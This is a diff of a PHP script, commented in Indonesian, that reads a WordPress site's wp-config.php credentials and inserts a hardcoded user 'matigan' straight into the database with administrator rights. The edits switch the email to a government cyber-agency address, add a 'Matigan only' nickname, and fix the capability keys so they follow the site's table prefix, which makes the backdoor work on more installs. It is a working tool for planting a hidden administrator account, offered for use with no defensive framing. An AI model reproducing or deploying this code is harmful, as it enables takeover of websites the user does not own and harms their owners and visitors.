@@ -10,7 +10,7 @@ $wp_config_path = $document_root . '/wp-config.php';
 // Variabel untuk data pengguna
 $user = 'matigan'; // Ganti dengan nama pengguna yang Anda inginkan
 $user_password = 'biringsayang45'; // Ganti dengan kata sandi yang Anda inginkan
-$email = 'matigan@fefek.go.id'; // Ganti dengan alamat email yang Anda inginkan
+$email = 'matigan@bssn.go.id'; // Ganti dengan alamat email yang Anda inginkan
 
 // Periksa apakah file wp-config.php ada
 if (file_exists($wp_config_path)) {
@@ -28,7 +28,7 @@ if (file_exists($wp_config_path)) {
     $conn = @mysqli_connect($localhost, $username, $password, $database) or die(mysqli_error($conn));
 
     // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
-    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56')";
+    $sqlInsertUser = "INSERT INTO {$prefix}users (user_login, user_pass, user_email, user_status, user_registered, user_nicename) VALUES ('$user', MD5('$user_password'), '$email', '0', '2022-09-09 05:42:56', 'Matigan only')";
 
     // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_users
     $insertUserResult = @mysqli_query($conn, $sqlInsertUser) or die(mysqli_error($conn));
@@ -41,8 +41,8 @@ if (file_exists($wp_config_path)) {
         $userId = mysqli_insert_id($conn);
 
         // Pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
-        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')";
-        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, 'wp_user_level', '10')";
+        $sqlInsertUsermeta1 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
+        $sqlInsertUsermeta2 = "INSERT INTO {$prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, $userId, '{$prefix}user_level', '10')";
 
         // Jalankan pernyataan SQL untuk memasukkan data ke dalam tabel wp_usermeta
         $insertUsermetaResult1 = @mysqli_query($conn, $sqlInsertUsermeta1) or die(mysqli_error($conn));
